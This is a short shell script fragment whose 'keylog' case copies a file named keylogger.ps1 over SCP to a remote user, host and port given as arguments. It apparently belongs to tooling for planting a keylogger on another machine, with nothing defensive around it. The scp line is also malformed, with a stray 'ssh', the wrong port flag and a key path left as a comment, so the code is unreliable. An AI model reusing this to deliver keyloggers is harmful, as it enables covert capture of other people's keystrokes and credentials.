# send file via SCP
case ${1} in
keylog) scp /keylogger.ps1 ssh ${2}@${3} -p ${4} -i #path to loginRSAKEY
  
  ;;
esac
